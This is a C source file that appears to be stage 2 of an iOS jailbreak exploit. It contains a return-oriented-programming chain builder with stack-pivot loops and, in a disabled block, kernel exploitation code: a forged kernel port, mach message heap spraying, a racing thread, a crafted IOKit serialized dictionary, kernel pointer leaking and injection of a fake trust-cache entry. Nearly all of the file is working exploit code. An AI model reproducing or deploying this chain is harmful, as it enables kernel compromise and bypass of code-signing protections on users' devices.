#include "common.h"
#include "rop.h"
#include "stage2.h"
#include "stage1.h"
#include <mach/mach.h>
#include <aio.h>
#include <fcntl.h>
#include <dlfcn.h>

#include <shared/iokit.h>

typedef struct {
	mach_msg_header_t head;
	mach_msg_body_t msgh_body;
	mach_msg_ool_ports_descriptor_t desc[1];
	char pad[4096]; // FIXME: what a waste
} ool_message_struct;

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_NONE 0
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25
#define NENT 1

uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
	while (ropvars != NULL) {
		if (!strcmp(name,ropvars->name)) {
			return ropvars->stage_addr;
		}
		ropvars = ropvars->next;
	}
	printf("Stage 3 ROP VAR %s not found\n",name);
	exit(-1);
}
void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
	rop_gadget_t * next = offsets->stage2_ropchain;	
	rop_gadget_t * prev_gadget;
	uint64_t buf;
	int offset_delta = 0;
	uint64_t chain_pos = 0;
	while (next != NULL) {
		switch (next->type) {
			case CODEADDR:
				buf = next->value;
				// we add and then subtract cause otherwise this could underflow
				buf += offsets->new_cache_addr;
				buf -= 0x180000000;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage2_base + offset_delta;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case REL_OFFSET:
				buf = next->value + chain_pos + offsets->stage2_base;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case STATIC:
				buf = next->value;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case BUF:
				write(fd,(void*)next->value,next->second_val);
				offset_delta += next->second_val;
				chain_pos += next->second_val;
				break;
			case BARRIER:
				if (chain_pos > next->value) {
					printf("stage 2 doesn't have enought space\n");
					exit(1);
				}
				uint64_t diff = next->value - chain_pos - offsets->stage2_base;
				chain_pos += diff;
				offset_delta += diff;
				char * tmp = malloc(diff);
				write(fd,tmp,diff);
				free(tmp);
				break;
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case ROP_LOOP_START:
				{
				char * loop_buf_name = (char*)next->value;
				// get the length we need from one ROP_LOOP_BREAK in the chain
				int chain_per_break = 0;
				int chain_for_loop_end = 0;
				{
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = 0;
						int rop_var_tmp_nr = 0;
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
						chain_per_break = ropchain_len * 8;
						chain_for_loop_end = chain_per_break*2; // we have to calls for end
						chain_per_break += 36*8; // add the if monster below
				}
				int loop_size = 0;
				rop_gadget_t * lookahead_gadget = next->next;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_for_loop_end;break;}
					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
					else {loop_size += 8;}
					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
					lookahead_gadget = lookahead_gadget->next;
				}
				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}

				rop_gadget_t * bck_next = next->next;
				free(next);
				prev_gadget->next = bck_next;
				next = bck_next;
				uint64_t chain_start = chain_pos + offsets->stage2_base;
				uint64_t chain_start_in_file = chain_pos;

				// replace all the ROP_LOOP_BREAK gadgets with the chain
				lookahead_gadget = next;
				uint64_t lookahead_pos = chain_pos;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						
						
						// mmap the file back over the loop
						int mmap_size = loop_size;
						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
						ADD_COMMENT("restore the loop stack");
						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED | MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
						
						ADD_COMMENT("stack pivot mov sp,x2");
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
						curr_gadget->next = bck_next;
						break;
					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						
						/* TLDR on what that monster does:
						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (free/pivot)
						 * if we are nonezero we basically do nothing and because of that run into the free and pivot calls
						 */
					    ADD_GADGET(); 
						ADD_GADGET(); 
						ADD_GADGET(); /* d9 */ 
						ADD_GADGET(); /* d8 */ 
						ADD_GADGET(); /* x28 */
						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ 
						ADD_GADGET(); /* x26 */ 
						ADD_GADGET(); /* x25 */
						ADD_GADGET(); /* x24 */
						ADD_GADGET(); /* x23 */
						ADD_GADGET(); /* x22 */
						ADD_GADGET(); /* x21 */
						ADD_GADGET(); /* x20 */
						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
						ADD_GADGET(); /* x29 */ 
						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	
					    ADD_GADGET(); /* x19 (if nonezero) */ 
					    ADD_GADGET(); /* x20 (if nonezero) */
					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonzero) d8 (if zero) */
					    ADD_GADGET(); /* x28 (if zero) */ 
					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
						ADD_GADGET(); /* d9  (not 0) x26 (0) */
						ADD_GADGET(); /* d8  (not 0) x25 (0) */
						ADD_REL_OFFSET_GADGET(88/*our own chain*/+chain_for_loop_end /*the two calls below*/); /* x28 (not 0) x24 (0) */
					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */
					    ADD_GADGET(); /* x20 (not 0) */
					    ADD_GADGET(); /* x19 (not 0) */
						ADD_GADGET(); /* x29 (not 0) */
						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
						curr_gadget->next = bck_next;
					}else {lookahead_pos += 8;}
					lookahead_gadget = lookahead_gadget->next;
				}

				continue; // we have to handle the current gadget again, cause we overwrote it
				}
				break;
			case ROP_LOOP_BREAK:
				printf("ROP_LOOP_BREAK OUTSIDE OF A LOOP\n");
				exit(1);
				break;
			case ROP_LOOP_END:
				break;
			default:
				buf = 0;
				write(fd,&buf,8);
				chain_pos += 8;
		}
		prev_gadget = next;
		next = next->next;
	}
	offsets->stage2_size = chain_pos + 0x1000;
}
uint64_t get_addr_from_name(offset_struct_t * offsets, char * name) {
	uint64_t sym = dlsym(RTLD_DEFAULT,name);
	uint64_t cache_addr = 0;
	syscall(294, &cache_addr);
	sym -= cache_addr;
	sym += 0x180000000;
	return sym;
}
char * pos_description_DBG(int pos, int longjmp_buf) {
	char * buf = malloc(100);
	memset(buf,0,100);
	if (longjmp_buf) {
		if (pos == 13) {
			snprintf(buf,100,"stack pivots here");
		}
		return buf;
	} 
	if (pos >= 5 && pos <= 13) {
		int arg = pos-4;
		if (arg == 6) {arg = 7;}
		else if (arg == 7) {arg = 6;}
		snprintf(buf,100,"ARG %d",arg);
	}
	return buf;
} 
void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
	rop_gadget_t * next = offsets->stage2_ropchain;	
	rop_gadget_t * prev_gadget;
	uint64_t current_addr = offsets->stage2_base;
	uint64_t buf;
	int offset_delta = 0;
	int longjmp_buf = 1;
	int pos = 0;
	char * pos_buf = NULL;
	printf("STAGE 2 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm\n",offsets->stage2_base);
	while (next != NULL) {
		switch (next->type) {
			case CODEADDR:
				buf = next->value;
				// we add and then we subtract otherwise it could underflow
				buf += offsets->new_cache_addr;
				buf -= 0x180000000;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (code address org:%llx) ",buf,next->value);
				if (next->value == offsets->BEAST_GADGET) {
					printf("Beast gadget (x30)\n");
					printf("=\n");
					pos = 0;
				}else if (next->value == offsets->BEAST_GADGET_LOADER) {
					printf("Beast gadget loader (x30)\n");
				}else if (next->value == offsets->str_x0_gadget) {
					printf("return val (x0) storing gadget (ARG 8) is the address where we will store to\n");
				}else if (next->value == offsets->memcpy) {
					printf("memcpy\n");
				}else{
					printf("normal call if you want to know what this is you have to check your offset struct\n");
				}
				current_addr += 8;
				break;
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage2_base+ offset_delta;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case REL_OFFSET:
				buf = next->value + current_addr;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case STATIC:
				buf = next->value;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (static) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case BUF:
				offset_delta += next->second_val;
				current_addr += next->second_val;
				printf("BUFFER INSERTED HERE size: 0x%x spans to 0x%llx\n",next->second_val,current_addr);
				longjmp_buf = 0;
				pos = 0;
				break;
			case BARRIER:
				if (current_addr > next->value) {
					printf("stage 2 doesn't have enought space\n");
					exit(1);
				}
				uint64_t diff = next->value - current_addr;
				current_addr += diff;
				offset_delta += diff;
				printf("ADDED BARRIER HERE size: 0x%llx spans to 0x%llx\n",diff,current_addr);
				break;
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (variable) (%s realaddr: %llx) %s\n",buf,(char*)next->value,buf-next->second_val,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case ROP_LOOP_START:
				{
				char * loop_buf_name = (char*)next->value;
				// get the length we need from one ROP_LOOP_BREAK in the chain
				int chain_per_break = 0;
				int chain_loop_end = 0;
				{
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = 0;
						int rop_var_tmp_nr = 0;
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
						chain_per_break = ropchain_len * 8;
						chain_loop_end = chain_per_break*2; // two calls for end
						chain_per_break += 36*8; // add the if monster chain from below
				}
				int loop_size = 0;
				rop_gadget_t * lookahead_gadget = next->next;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_loop_end; break;}
					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
					else {loop_size += 8;}
					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
					lookahead_gadget = lookahead_gadget->next;
				}
				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}

				rop_gadget_t * bck_next = next->next;
				free(next);
				prev_gadget->next = bck_next;
				next = bck_next;
				uint64_t chain_start = current_addr;
				uint64_t chain_start_in_file = current_addr-offsets->stage2_base;

				// replace all the ROP_LOOP_BREAK gadgets with the chain
				lookahead_gadget = next;
				uint64_t lookahead_pos = (current_addr-offsets->stage2_base)/8;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						
						
						ADD_COMMENT("restore the loop stack");
						int mmap_size = loop_size;
						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED|MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
						
						ADD_COMMENT("stack pivot mov sp,x2");
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
						
						curr_gadget->next = bck_next;
						break;
					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;

						/* TLDR on what that monster does:
						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (free/pivot)
						 * if we are nonezero we basically do nothing and because of that run into the free and pivot calls
						 */
					    ADD_GADGET(); 
						ADD_GADGET(); 
						ADD_GADGET(); /* d9 */ 
						ADD_GADGET(); /* d8 */ 
						ADD_GADGET(); /* x28 */
						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ 
						ADD_GADGET(); /* x26 */ 
						ADD_GADGET(); /* x25 */
						ADD_GADGET(); /* x24 */
						ADD_GADGET(); /* x23 */
						ADD_GADGET(); /* x22 */
						ADD_GADGET(); /* x21 */
						ADD_GADGET(); /* x20 */
						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
						ADD_GADGET(); /* x29 */ 
						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	
					    ADD_GADGET(); /* x19 (if nonezero) */ 
					    ADD_GADGET(); /* x20 (if nonezero) */
					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonzero) d8 (if zero) */
					    ADD_GADGET(); /* x28 (if zero) */ 
					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
						ADD_GADGET(); /* d9  (not 0) x26 (0) */
						ADD_GADGET(); /* d8  (not 0) x25 (0) */
						ADD_REL_OFFSET_GADGET(88/*our own chain*/+chain_loop_end /*the two calls below*/); /* x28 (not 0) x24 (0) */
					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */
					    ADD_GADGET(); /* x20 (not 0) */
					    ADD_GADGET(); /* x19 (not 0) */
						ADD_GADGET(); /* x29 (not 0) */
						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */

						
						ADD_COMMENT("stack pivot mov sp,x2");
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
						curr_gadget->next = bck_next;
					}else{lookahead_pos += 8;}
					lookahead_gadget = lookahead_gadget->next;
				}

				printf("ADDED LOOP WITH SIZE %d starting at 0x%llx\n",loop_size,chain_start);
				continue; // we have to handle the current gadget again, cause we overwrote it
				}
			case ROP_LOOP_BREAK:
				printf("ROP_LOOP_BREAK OUTSIDE OF A LOOP\n");
				exit(1);
				break;
			case ROP_LOOP_END:
				break;
			default:
				buf = 0;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (NOP)\n",buf);
				pos++;
				current_addr += 8;
				break;
		}
		if (next->comment != NULL) {
			printf("COMMENT(line: %llu): ",next->comment->line);
			puts(next->comment->comment);
		}
		prev_gadget = next;
		next = next->next;
	}
	printf("===\n");
}
void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
	void * buf_pointer = offsets->stage2_databuffer;
	uint64_t buf_in_stage = offsets->stage2_base;
	uint32_t buffer_size = 0;
	buf_pointer += 22*8; // jump over the longjmp we have at the start of the buffer
	buf_in_stage += 22*8;
	rop_var_t * current_var = ropvars;
	while (current_var != NULL) {
		buffer_size += current_var->size;
		if (buffer_size > offsets->stage2_databuffer_len) {
			printf("STAGE 3, DATABUFFER TO SMALL\n");
			exit(-1);
		}
		// copy the variable into the buffer
		memcpy(buf_pointer,current_var->buffer,current_var->size);
		current_var->stage_addr = buf_in_stage;
		buf_pointer += current_var->size;
		buf_in_stage += current_var->size;
		current_var = current_var->next;
	}
}
void stage2(offset_struct_t * offsets,char * base_dir) {


	offsets->stage2_databuffer_len = 0x10000;
	offsets->stage2_databuffer = malloc(offsets->stage2_databuffer_len);

	// let's go
	INIT_FRAMEWORK(offsets);
/*	
	CALL_FUNC(0x0,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	CALL_FUNC_WITH_RET_SAVE(0x0,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	uint64_t * test = malloc(sizeof(uint64_t));
	*test = 10;
	DEFINE_ROP_VAR("test",8,test);
	SET_ROP_VAR64("test",14);
	DEFINE_ROP_VAR("test2",8,test);
	ROP_VAR_CPY("test","test2",8);
	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	ADD_COMMENT("var/arg test");
	ROP_VAR_ARG("test",1);
	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	*/

#define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	ADD_COMMENT(name); \
	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);

	char * buf[1024];
	snprintf(&buf,sizeof(buf),"testing...");
	DEFINE_ROP_VAR("test_string",sizeof(buf),&buf);

	ADD_LOOP_START("test_loop")
		ROP_VAR_ARG("test_string",2);
		CALL("write",1,0,1024,0,0,0,0,0);
	ADD_LOOP_END();

#if 0
	
	// SETUP VARS
	char * tmp = malloc(0x1000);
	DEFINE_ROP_VAR("should_race",sizeof(mach_port_t),tmp); //
	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
	DEFINE_ROP_VAR("the_one",sizeof(mach_port_t),tmp); // the port to which we have a fakeport in userland
	DEFINE_ROP_VAR("desc_addr",8,tmp); // pointer to the port buffer

	ool_message_struct * ool_message = malloc(sizeof(ool_message_struct));
	ool_message->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    ool_message->head.msgh_local_port = MACH_PORT_NULL;
    ool_message->head.msgh_size = (unsigned int)sizeof(ool_message) - 2048;
    ool_message->msgh_body.msgh_descriptor_count = 1;
    ool_message->desc[0].count = 1; // will still go to kalloc.16 but we don't have another point of failture
    ool_message->desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ool_message->desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;

	DEFINE_ROP_VAR("ool_msg",sizeof(ool_message_struct),ool_message); // the message we will send to the kernel
	DEFINE_ROP_VAR("ool_msg_recv",sizeof(ool_message_struct),tmp); // the message we will recieve from the kernel

	ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc) + offsetof(mach_msg_ool_ports_descriptor_t, address) /*offset of desc[0].address*/,"tmp_port",0,sizeof(ool_message->desc[0].address));


	kport_t * fakeport = malloc(sizeof(kport_t));
	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
	fakeport->ip_references = 100;
	fakeport->ip_lock.type = 0x11;
	fakeport->ip_messages.port.receiver_name = 1;
	fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
	fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
	fakeport->ip_srights = 99;

	DEFINE_ROP_VAR("fakeport",sizeof(kport_t),fakeport); // the userland port

	DEFINE_ROP_VAR("service",sizeof(io_service_t),tmp); // RootDomain Service
	DEFINE_ROP_VAR("client",sizeof(io_connect_t),tmp); // RootDomainUC

	unsigned int raw_dict[] = {
		kOSSerializeMagic,
		kOSSerializeEndCollection | kOSSerializeData | 0x10,
		0xaaaaaaaa,
		0xbbbbbbbb,
		0x00000000,
		0x00000000,
	};
	unsigned int * dict = malloc(sizeof(raw_dict));

	DEFINE_ROP_VAR("dict",sizeof(raw_dict),dict); // dict for the UC
	SET_ROP_VAR64_TO_VAR_W_OFFSET("dict",2*4,"fakeport",0); // overwrite 0xaa..bb with the address of our fakeport

	DEFINE_ROP_VAR("self",sizeof(mach_port_t),&tmp);


	// setup new trustcache struct
	typedef char hash_t[20];
	struct trust_chain {
		uint64_t next;
		unsigned char uuid[16];
		unsigned int count;
		hash_t hash[0];
	};
	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
	snprintf(&new_entry->uuid,16,"TURNDOWNFORWHAT?");
	new_entry->count = 1;
	// FIXME: set hash here
	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);

	char * dylib_str = malloc(100);
	snprintf(dylib_str,100,"FIXME");
	DEFINE_ROP_VAR("dylib_str",strlen(dylib_str)+1,dylib_str);

	char * wedidit_msg = malloc(100);
	snprintf(wedidit_msg,100,"WE DID IT\n");
	DEFINE_ROP_VAR("WEDIDIT",strlen(wedidit_msg)+1,wedidit_msg);

#define BARRIER_BUFFER_SIZE 0x10000
	// spawn racer thread
	DEFINE_ROP_VAR("racer_thread",sizeof(pthread_t),tmp);
	ROP_VAR_ARG("racer_thread",1);
	CALL("pthread_create",0,offsets->longjmp-0x18095c2e4+offsets->new_cache_addr /*slide it here*/,offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/,0,0,0,0,0);


	ADD_COMMENT("mach_task_self");
	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name(offsets,"mach_task_self"),0,0,0,0,0,0,0,0);

	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16

	ADD_LOOP_START("main_loop");
	
		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 

		// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
		ROP_VAR_ARG64("self",1);
		ROP_VAR_ARG("msg_port",3);
		CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
	
		ROP_VAR_ARG64("self",1);
		ROP_VAR_ARG64("msg_port",2);
		ROP_VAR_ARG64("msg_port",3);
		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);

		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_remote_port) /*offset of head.msgh_remote_port */,"msg_port",0,sizeof(mach_port_t));

		ROP_VAR_ARG("ool_msg",1);
		ROP_VAR_ARG_W_OFFSET("ool_msg",3, offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_size) /*offset of head.msgh_size */);
		CALL("mach_msg",0,MACH_SEND_MSG,0,0,0,0,0,0);

		// no need for another loop in rop... we can just unroll this one here
		for (int i = 0; i < 10; i++) {
			ROP_VAR_ARG64("client",1);
			ROP_VAR_ARG("dict",3);
			CALL("IOConnectCallStructMethod",0,7,0,sizeof(raw_dict),0,0,0,0);
		}

		ROP_VAR_CPY_W_OFFSET("ool_msg_recv", offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_local_port) /*offset of head.msgh_local_port */,"msg_port",0,sizeof(mach_port_t));

		ROP_VAR_ARG("ool_msg_recv",1);
		ROP_VAR_ARG64("msg_port",5);
		CALL("mach_msg",0,MACH_RCV_MSG,0,sizeof(ool_message_struct),0,0,0,0);


		// check if we found a port:

		// copy the descriptor address into it's own var
		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2, offsetof(ool_message_struct,desc) + offsetof(mach_msg_ool_ports_descriptor_t, address) /*offset of .desc[0].address*/);
		ROP_VAR_ARG("desc_addr",1);
		CALL("memcpy",0,0,8,0,0,0,0,0);

		// copy the first 8 bytes at the descriptor address into the_one
		ROP_VAR_ARG("the_one",1);
		ROP_VAR_ARG64("desc_addr",2);
		CALL("memcpy",0,0,8,0,0,0,0,0);

		// set x0 to the_one
		SET_X0_FROM_ROP_VAR("the_one");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("main_loop");

	ADD_LOOP_END();

	SET_ROP_VAR64("should_race",1); // stop the other thread

	ROP_VAR_ARG("WEDIDIT",2);
	CALL("write",1,0,strlen(wedidit_msg),0,0,0,0,0);

	CALL("sleep",10000,0,0,0,0,0,0,0);

	// get kernel slide
	// alloc new valid port 
	DEFINE_ROP_VAR("notification_port",sizeof(mach_port_t),tmp);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("notification_port",3);
	CALL("_kernelrpc_mach_port_allocate_trap",0,MACH_PORT_RIGHT_RECEIVE,0,0,0,0,0,0);

	// set notification port on our fake port so that we can read back the pointer
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG64("the_one",2);
	ROP_VAR_ARG64("notification_port",5);
	ROP_VAR_ARG64("tmp_port",7);
	CALL("mach_port_request_notification",0,0,MACH_NOTIFY_PORT_DESTROYED, 0, 0, MACH_MSG_TYPE_MAKE_SEND_ONCE,0,0);

	// get the heap addr
	DEFINE_ROP_VAR("heap_addr",sizeof(uint64_t),tmp);
	ROP_VAR_CPY_W_OFFSET("fakeport",offsetof(kport_t,ip_pdrequest) /*offset of fakeport.ip_pdrequest*/,"heap_addr",0,sizeof(uint64_t));
	
	// setup kr32
	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
